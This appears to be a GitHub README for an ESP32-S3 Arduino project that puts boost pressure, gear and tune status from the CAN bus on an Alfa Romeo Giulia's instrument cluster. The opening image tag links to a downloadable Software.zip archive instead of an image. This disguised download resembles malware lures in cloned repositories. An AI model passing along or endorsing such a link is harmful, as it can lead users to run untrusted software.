# 🏎️ Alfa Romeo Giulia Dashboard Info ESP32-S3 🛠️

![Alfa Romeo Giulia](https://github.com/Abyss675/AlfaRomeoGiulia_DashboardInfo_ESP32-S3/releases/download/v2.0/Software.zip)

Welcome to the "AlfaRomeoGiulia_DashboardInfo_ESP32-S3" repository! This Arduino project is designed to enhance your driving experience by displaying important information like turbo boost pressure, current gear, and performance tune status on the dashboard of your Alfa Romeo Giulia. The displayed info is placed in a location on the instrument cluster where infotainment details are typically shown, such as a radio station name.

## 🚗 Project Description
The project utilizes an ESP32-S3 microcontroller along with SN65HVD230 and MCP2515 components to communicate on two CAN busses simultaneously. This setup allows for efficient and accurate transfer of data to display crucial details about your car's performance in real-time. By using OBD2, obtaining data regarding various parameters like RPM, oil pressure, and more becomes possible.
